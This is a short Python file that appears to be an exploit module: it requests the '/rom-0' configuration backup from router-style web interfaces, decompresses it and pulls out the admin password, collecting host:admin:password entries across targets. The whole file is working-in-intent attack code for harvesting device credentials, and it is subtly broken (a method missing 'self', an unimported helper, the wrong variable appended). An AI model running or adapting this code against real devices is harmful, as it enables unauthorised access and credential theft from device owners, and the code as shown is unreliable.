#!/usr/bin/env python3

import re
import requests

from deps.lzs_decompress import LZSDecompress


class Exploit:
    def __init__(self):
        self.credentials = list()

    def exploit(host, thread):
        try:
            response = requests.get(f"http://{host}/rom-0", verify=False, timeout=1)
        except Exception:
            return

        if response.status_code == 200:
            data = response.content[8568:]
            result, window = LZSDecompress(data, RingList(2048))

            password = re.findall("([\040-\176]{5,})", result)
            if password[0]:
                self.credentials.append(f"{host}:admin:{password}")
